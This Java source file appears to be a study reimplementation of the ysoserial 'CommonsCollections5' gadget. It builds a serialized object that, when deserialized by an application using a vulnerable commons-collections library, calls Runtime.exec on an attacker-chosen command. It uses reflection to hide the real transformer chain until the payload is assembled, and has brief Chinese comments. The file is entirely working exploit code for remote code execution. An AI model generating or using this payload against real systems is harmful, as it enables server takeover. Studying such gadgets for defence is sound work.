package com.hachp1.deser.ysoserial;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class CC5 {

    public static Object getObject(String cmd) throws Exception {
        // 此时内部的Transformer是无效的，避免生成payload过程中提前执行
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });

        // 真正的Transformer调用链
        Transformer[] trueTransformer = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        HashMap<Object, Object> hashMap = new HashMap<>();
        Map evalMap = LazyMap.decorate(hashMap, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(evalMap, "test");

        BadAttributeValueExpException res = new BadAttributeValueExpException(null);
        Class<? extends BadAttributeValueExpException> clazz = res.getClass();
        Field val = clazz.getDeclaredField("val");
        val.setAccessible(true);
        val.set(res, tiedMapEntry);

        // 最后记得将真正的Transformer链放入ChainedTransformer
        Class<? extends ChainedTransformer> chainedTransformerClass = chainedTransformer.getClass();
        Field iTransformers = chainedTransformerClass.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer, trueTransformer);
        return res;
    }
}
